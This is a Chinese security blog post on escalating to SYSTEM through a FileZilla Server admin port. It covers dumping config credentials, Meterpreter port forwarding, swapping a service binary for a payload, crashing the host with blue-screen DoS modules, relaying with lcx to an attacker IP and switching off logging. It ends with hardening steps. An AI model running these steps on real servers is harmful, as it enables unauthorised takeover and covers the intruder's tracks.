> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kgMGYGkO-YOww6qfEAJlrA)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

**0x01 前言**

FileZilla 是一款非常流行的免费、开源 FTP 软件，分为客户端 FileZilla Client 和服务器端 FileZilla Server 两个版本，具备所有 FTP 软件功能。可控性、有条理的界面和管理多站点的简化方式使得 FileZilla Client 成为一个方便高效的 FTP 客户端工具，而 FileZilla Server 则是一个小巧且支持 FTP、FTPS、SFTP 等文件传输协议的 FTP 服务器软件，官方网站：https://filezilla-project.org/。  

**本地测试环境信息：**

```
操作系统：Windows Server 2003 x86 & Windows Server 2008 R2 x64
软件版本：FileZilla_Server-0_9_44.exe、FileZilla_3.6.0.2_win32.exe
默认安装路径：C:\Program Files (x86)\FileZilla Server\
FileZilla Server进程：FileZilla Server.exe、FileZilla Server Interface.exe
FileZilla Server服务：FileZilla Server
FileZilla Server端口：21、14147
```

**0x02 信息搜集**

(1) 前期信息搜集时我们可以先尝试用 Nmap 等端口扫描工具进行简单的扫描，这样能够得到目标机器使用的 FileZilla 软件版本等信息。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MIwPibIEfZPk430t06GeKkJ4RWnroaibwg6RFQEmj1LtFic25cOGQ3ufww/640?wx_fmt=png)

(2) 首先利用 tasklist /svc 命令查看 FileZilla 相关进程、服务名以及进程 PID 值。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MbW6mZUuD1ruAyg8G9KibhxEtAOepXjoZJthzmLwHibnB7StCo2FdKLMA/640?wx_fmt=png)

然后用 netstat -ano 命令查看 PID 值为 1204 的运行端口号是不是默认的 14147。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MPfG5DSmH5mwAPUib3T6lrQxVSrxhYcImBDp7xxLpib4UesibicznB4VvKQ/640?wx_fmt=png)

最后再用 sc qc "FileZilla Server" 命令查看 FileZilla Server 服务相关配置信息。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MWLczicibehwfwJKiaIOrf9iavfzITzONvRZw9T900lRFHDpXc8Pkicy0IOg/640?wx_fmt=png)

  
(3) 也可以直接使用 Metasploit 下的 filezilla_server 模块来查找 FileZilla Server 软件的安装路径、配置文件以及 FTP 用户凭证、磁盘权限等信息。

```
windows/gather/credentials/filezilla_server
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MbQxx3BHuhMSEy8a6APZT0TqvAL9sU6x7p6YUh2JYxYIGXW0I29vW4A/640?wx_fmt=png)  

FileZilla Server Interface.xml 配置文件里存放着 FileZilla Server 服务端在连接时的登录信息，如下表。

```
<FileZillaServer>
  <Settings>
    <Item >127.0.0.1</Item>     //连接IP地址
    <Item >14147</Item>           //连接端口号
    <Item >90sec!@#123</Item>  //连接密码
    <Item >0</Item>
  </Settings>
</FileZillaServer>
```

FileZilla Server.xml 配置文件里存放着 FTP 用户信息，包括用户、密码、管理目录和权限等，如下表。

```
<FileZillaServer>
  <Settings>
        <Item >14147</Item>
  </Settings>
  <Groups />
  <Users>
     <User >    //FTP用户
       <Option >e10adc3949ba59abbe56e057f20f883e</Option>  //FTP密码
       <Option ></Option>
       <Option >0</Option>
       <Option >0</Option>
       <Option >0</Option>
       <Option >1</Option>
       <Option ></Option>
       <Option >0</Option>
       <Option >0</Option>
       <IpFilter>
            <Disallowed />
            <Allowed />
       </IpFilter>
            <Permissions>
                <Permission Dir="C:">        //管理目录为C盘，权限1=有，0=没有
                    <Option >1</Option>       //有文件读取权限
                    <Option >1</Option>      //有文件写入权限
                    <Option >1</Option>     //有文件删除权限
                    <Option >1</Option>     //有文件追加权限
                    <Option >1</Option>      //有创建目录权限
                    <Option >1</Option>      //有删除目录权限
                    <Option >1</Option>        //有列出目录权限
                    <Option >1</Option>     //有加子目录权限
                    <Option >1</Option>
                    <Option >0</Option>
                </Permission>
            </Permissions>
            <SpeedLimits DlType="0" DlLimit="10" ServerDlLimitBypass="0" UlType="0" UlLimit="10" ServerUlLimitBypass="0">
                <Download />
                <Upload />
            </SpeedLimits>
     </User>
  </Users>
</FileZillaServer>
```

****注：****这两个配置文件在安装时默认只给了 users 组的读取 / 执行权限，所以在 Webshell 下没有权限对这两个文件进行修改和删除，但我们在本地机器上连接目标服务器的 14147 端口后（SYSTEM），如果成功创建、修改、删除用户时配置文件也会随之更新。

****0x03 提权过程****

(1) 将目标机器上的 C:\Program Files (x86)\FileZilla Server \ 整个文件夹打包下载到我们本地，然后在 Meterpreter 会话中用 portfwd 命令将目标机器运行的 Filezilla Server 软件管理端口 14147 给转发到我们 Kali 机器的 12345 端口。

```
meterpreter > portfwd add -r 127.0.0.1 -p 14147 -l 12345
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MdgRRMufC1fF352GlbPOYSI0CLbUTMbId5v3f0OLicgPo8mq5zQpk5GA/640?wx_fmt=png)

(2) 这里因为我们已经将目标机器的 14147 端口转发到了 Kali 机器 12345 端口了，所以在本地机器上运行 Filezilla Server 软件时填写的是 Kali 机器的 IP 地址和端口，否则可能连接不上。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MN9v45P0XaWHG8OLEXYLSicOBq2FlIWmPBYFAdVQibNfNRibxky1pnRDsQ/640?wx_fmt=png)

(3) 我们连接上 Filezilla Server 软件后就可以创建 FTP 用户名和密码了，这里笔者创建了一个具有 C 盘权限的 FTP 用户，并给予了文件的读取 / 写入 / 删除 / 追加，目录的列出 / 创建 / 删除等权限。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MDiazl9yqTU5WGn9rKrqdc6bLXjRakeZ2j3EmCjoMLZktU18Q9K1N3vA/640?wx_fmt=png)

(4) 提权思路在后边会有一个简单总结，这里笔者就先以 “替换系统服务” 进行举例。在我们成功创建 FTP 用户后先不着急去 FTP 客户端连接，先在 “中国菜刀” 的命令行中执行以下命令找一个以 SYSTEM 权限运行，启动方式为 Auto 的服务，或用 sc qc MySQLa 命令查看。

```
wmic service get Name,State,PathName,StartMode,StartName | findstr /i "Auto" | findstr /i "LocalSystem" | findstr /i "Running"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MJckRAkKVpJySQOrnnKzIbXayLicnhHyUQVRLfczdQ8PROYOnbfqCiblA/640?wx_fmt=png)

(5) FTP 客户端里替换我们刚找到的 C:\phpStudy\MySQL\bin\mysqld.exe 文件为我们的攻击载荷文件，然后通过某些蓝屏重启 EXP 或者等待服务器管理员重启服务器，从而达到权限提升目的，Metasploit 下的蓝屏重启模块有以下几个。

```
MS12-020 - CVE-2012-0002 - KB2621440  -（auxiliary/dos/windows/rdp/ms12_020_maxchannelids）
MS15-034 - CVE-2015-1635 - KB3042553  -（auxiliary/dos/http/ms15_034_ulonglongadd）
CVE-2018-8897  -（exploit/windows/local/mov_ss）
[...SNIP...]
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MYZ7N1QOfe2wC6GibqHf6gviaVd64jFzGSGtt6ickibqnD7Fv93HEdVvljQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1Mzyz9Xt36michkEqCZ1v4f76lVF5iaIpyD0OIEDVAb4jEY3EzxyJRmseQ/640?wx_fmt=png)

****注：****如果经常遇到获取 Meterpreter 会话后自动断开的情况，可以尝试在监听模块设置下自动运行进程迁移脚本的参数可能就好了。

```
set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
```

**0x04 思路总结**

```
1、LPK.DLL劫持，将lpk.dll上传至可执行文件目录下。（2003，不用重启！）
2、替换系统程序，C:\Windows\System32\sethc.exe。（2003，不用重启！）
3、替换系统服务，找启动方式为Auto（自动）服务，替换对应程序。（2008，需要重启！）
4、篡改快捷方式，如：phpStudy.lnk，C:\phpStudy\phpStudy.exe。（需要管理员打开快捷方式！）
5、上传启动目录，C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup（2008，需要重启并登录！）
```

**0x05 常见问题**

本地机器监听 51 端口，连接用 14147 端口，实战中如果本地属内网环境需要先在路由器将 51 端口映射出来，然后执行监听，成功接收到返回数据后再连接 Filezilla Server。

```
本地机器：
C:\>lcx.exe -listen 51 14147

目标机器：
/c C:\aspSmartUpload\lcx.exe -slave {攻击者外网IP} 51 127.0.0.1 14147
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MkIPBJP2JwbHgprCEuBuHCWdTyftTkPy4icx2bG9uXY2NRKP3ydkJrRA/640?wx_fmt=png)

lcx 转发了 FileZilla Server 的 14147 端口后还是连接不上，返回右上图这样的报错，Google 翻译报错信息得知：协议错误：未通过身份验证，关闭连接，连接到服务器关闭。使用 netstat -ano 命令查看当前网络连接状态如下。

```
TCP       9*.1*9.4.1*3:139        0.0.0.0:0               LISTENING         4
TCP       9*.1*9.4.1*3:54133      1*3.2*1.*7.1*8:51       ESTABLISHED     2028
TCP       127.0.0.1:53            0.0.0.0:0               LISTENING       1040
TCP       127.0.0.1:14147         0.0.0.0:0               LISTENING       1088
TCP       127.0.0.1:14147         127.0.0.1:49160         ESTABLISHED     1088
TCP       127.0.0.1:49160         127.0.0.1:14147         ESTABLISHED     5736
```

****问题描述 1：****

可以通过 lcx.exe 工具将 FileZilla Server 的 14147 端口转发出来，但是返回数据中出错了，最终导致连接不上 FileZilla Server。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MPwGHo8kDkdcZiak01PHFpjXvyXONWtZ9KkGuylSrtcf1M9Iibichubvpw/640?wx_fmt=png)

****解决办法 1：****

Meterpreter 会话中使用 portfwd 命令进行转发，然后即可连接上目标的 FileZilla Server。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MDrVPDxCWIuictxLwOgMeWuNSZD32EzwPavzkwnzniafWbEPHicRSnQIBQ/640?wx_fmt=png)

****问题描述 2：****

连接上 FileZilla Server 并成功添加一个具备 C 盘权限的 FTP 用户，但在连接时仍然报错。

```
CMD命令行和FlashFXP连接报错：
421 Server is locked, please try again later.
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MRyu6JhTgAF1icESg9wAG2soINY2HJsquKYefYUEgOKzG3gTBBHQxBEA/640?wx_fmt=png)

****解决办法 2：****

在 FileZilla Server 软件界面中找到一个 “锁” 图标，只需点击一下解锁即可连接 FTP 了。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MQaEe1R5Ds6G2fibF9v295WoukLB5xsKdxibrhKZtbBlsD3lQwun39nMQ/640?wx_fmt=png)

**0x06 新版变更**

(1) 运行 FileZilla Server 0.9.60_2 前必须安装 KB2533623 补丁，否则可能出现以下报错。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MWUgia3rD4RmxZClVWlQYjVlxLveE4D9QmssxI27HBYmquVY2d0WZiaug/640?wx_fmt=png)

(2) 这个版本中删除了 FileZilla Server Interface.xml，而且对 FileZilla Server.xml 存储的 FTP 密码的加密方式也进行了变更，加了 SALT，无法直接通过解密 Md5 密文得到 FTP 的明文密码，但是仍然可以通过转发 14147 端口连接 FileZilla Server 并修改 FTP 密码和权限，这个方法不到万不得已并不建议使用。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MQIU2vzBnKy88JTQd2icZPUqLbO0AODLQHgB5vPSeZS6NBolvUicf1ThA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOficCaDlic0xP3hicDlKRnCJ1MDhIpbNKDYhT8lmFSPBkeL35tXufBjBgtqx9HleXuEvvB098uzpNvzg/640?wx_fmt=png)

**0x07 注意事项**

1.  在实际渗透测试过程中请注意备份要替换的文件，方便我们能够快速恢复到原始状态。  
    
2.  本地机器连接上 FileZilla Server 后关闭 Eidt->Settings->Logging、SSL/TLS、Autoban 选项。
    
3.  自己安装的 FileZilla Server 可能会因为与目标版本不一致而出现 “版本不同，协议错误” 等问题。
    
4.  FileZilla Server>=0.9.44 不再支持 XP、2003，如需在低版本操作系统上测试时请选择 <=0.9.43。
    
5.  FTP 分为主动和被动连接，Filezilla 的 21 端口不能被转发出来，21 端口转发出来后被动连接就会变成主动连接，而 Filezilla 是不支持主动连接的，就会发生积极拒绝的情况：“504 MODE Z not enabled” 或者 “数据 socket 错误：连接已拒绝”。
    
6.  2008 及以上系统的权限配置上要比 2003 严格的多，所以不能对 System32 目录下的文件进行修改 / 删除 / 重命名等操作，也就是不能用 “替换系统程序” 进行提权，用 “替换系统服务” 进行提权时建议找第三方服务，如：Apache2a、MySQLa 等。在进入系统后替换的服务会处于停止状态，需要恢复替换文件并重启这个服务。
    

**0x08 加固方案**

1.  新建一个 FileZilla 用户（Users 组），用这个用户来运行 “FileZilla Server” 服务。
    
2.  删除 “FileZilla Server” 安装目录 Users 组所有权限，添加 FileZilla 用户所有权限。
    
3.  FileZilla Server 管理密码和 FTP 密码尽可能的设置复杂一些（字母 + 数字 + 特殊字符）。
    
4.  启动日志记录（默认关闭），Edit->Settings->Logging->Enable logging to file、Use a different logfile each day。
    

**0x09 参考链接**

*   https://helpcdn.aliyun.com/knowledge_detail/49564.html
    
*   https://forum.filezilla-project.org/viewtopic.php?p=143188
    
*   https://support.microsoft.com/en-us/help/2533623/microsoft-security-advisory-insecure-library-loading-could-allow-remot
    

只需关注公众号并回复 “9527” 即可获取一套 HTB 靶场学习文档和视频，“1120” 获取安全参考等安全杂志 PDF 电子版，“1208” 获取个人常用高效爆破字典，“0221” 获取 2020 年酒仙桥文章打包，还在等什么？赶紧关注学习吧！

公众号

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xong5AN4sVjsv6p71ice1qcHHQZJIZ09xK3lQgJquhqTLfoa9qcQ7cVYw/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486401&idx=1&sn=1104aa3e7f2974e647d924dfde83e6af&chksm=cfa6afd2f8d126c47d81afd02f112daea41bce45305636e3bba9a67fbdcf6dbd0e88ff786254&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfUDrsHTbibHAhlaWGRoY4yMzOsSHefUAVibW0icEMD8jum4JprzicX3QbT6icvA6vDcyicDlBI4BTKQauA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484585&idx=1&sn=28a90949e019f9059cf9b48f4d888b2d&chksm=cfa6a0baf8d129ac29061ecee4f459fa8a13d35e68e4d799d5667b1f87dcc76f5bf1604fe5c5&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)